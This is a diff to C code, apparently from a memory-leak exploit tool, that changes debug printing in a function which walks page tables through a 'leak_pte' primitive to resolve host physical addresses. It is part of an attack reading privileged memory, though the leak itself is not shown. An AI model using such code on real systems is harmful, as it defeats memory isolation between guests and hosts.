@@ -139,13 +139,13 @@ hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm, const char *prefmt, 
 	}
 
 	if (hdm && in_direct_map(va, hdm)) {
-		if (verbose == 1 && prefmt) pr_dub("%s --> pa %lx\n", prefix, va-hdm);
+		if (prefmt) pr_dub("%s --> pa %lx\n", prefix, va-hdm);
 		return va - hdm;
 	}
 
 	u64 tries_pgd = 0, tries_pud = 0, tries_pmd = 0, tries_pte = 0;
 	hpa_t pgd_pa;
-	if (verbose == 1 && prefmt) pr_dub("%s -->", prefix);
+	if (prefmt) pr_dub("%s -->", prefix);
 retry_pgd:
 	if (tries_pgd >= RETRY_THRES+2) {
 		return -1;
@@ -155,16 +155,16 @@ retry_pgd:
 	if (verbose >= 2) dumpp(pgd_pa);
 	pte_t pgd = leak_pte(base, pgd_pa);
 	if (verbose >= 2) dumpp(pgd);
-	if (verbose == 1 && prefmt) pr_dub(" pgd %10lx", pgd);
+	if (prefmt) pr_dub(" pgd %10lx", pgd);
 	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907) || ((pgd & 0xfff) == 0x107))) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
+		if (prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
 		goto retry_pgd;
 	}
 
 	hpa_t l1;
 retry_pud:
 	if (tries_pud >= RETRY_THRES) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
+		if (prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
 		tries_pud = 0;
 		goto retry_pgd;
 	}
@@ -175,22 +175,22 @@ retry_pud:
 	if (verbose >= 2) dumpp(pud_pa);
 	pte_t pud = leak_pte(base, pud_pa);
 	if (verbose >= 2) dumpp(pud);
-	if (verbose == 1 && prefmt) pr_dub(" pud %10lx", pud);
+	if (prefmt) pr_dub(" pud %10lx", pud);
 	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x063) || ((pud & 0xfff) == 0x907) || ((pud & 0xfff) == 0x107) || ((pud & 0xfff) == 0xff7))) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
+		if (prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
 		goto retry_pud;
 	}
 	if (IS_HUGE(pud)) {
 		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
+		if (prefmt) pr_dub(" pa %10lx\n", pa);
 		return pa;
 	}
 
 	hpa_t l2;
 retry_pmd:
 	if (tries_pmd >= RETRY_THRES) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
+		if (prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
 		tries_pmd = 0;
 		goto retry_pud;
 	}
@@ -201,22 +201,22 @@ retry_pmd:
 	if (verbose >= 2) dumpp(pmd_pa);
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
-	if (verbose == 1 && prefmt) pr_dub(" pmd %10lx", pmd);
+	if (prefmt) pr_dub(" pmd %10lx", pmd);
 	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x063) || ((pmd & 0xfff) == 0x907)  || ((pmd & 0xfff) == 0x977) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3) || ((pmd & 0xfff) == 0x9f7))) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
+		if (prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		goto retry_pmd;
 	}
 	if (IS_HUGE(pmd)) {
 		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
 		if (verbose >= 2) dumpp(pa);
-		if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
+		if (prefmt) pr_dub(" pa %10lx\n", pa);
 		return pa;
 	}
 
 	hpa_t l3;
 retry_pte:
 	if (tries_pte >= RETRY_THRES) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
+		if (prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		tries_pte = 0;
 		goto retry_pmd;
 	}
@@ -227,14 +227,14 @@ retry_pte:
 	if (verbose >= 2) dumpp(pte_pa);
 	pte_t pte = leak_pte(base, pte_pa);
 	if (verbose >= 2) dumpp(pte);
-	if (verbose == 1 && prefmt) pr_dub(" pte %10lx", pte);
+	if (prefmt) pr_dub(" pte %10lx", pte);
 	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x977) || ((pte & 0xfff) == 0x107)  || ((pte & 0xfff) == 0x177) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
-		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx pmd %10lx", prefix, pgd, pud, pmd);
+		if (prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx pmd %10lx", prefix, pgd, pud, pmd);
 		goto retry_pte;
 	}
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dumpp(pa);
-	if (verbose == 1 && prefmt) pr_dub(" pa %10lx\n", pa);
+	if (prefmt) pr_dub(" pa %10lx\n", pa);
 	return pa;
 }
 
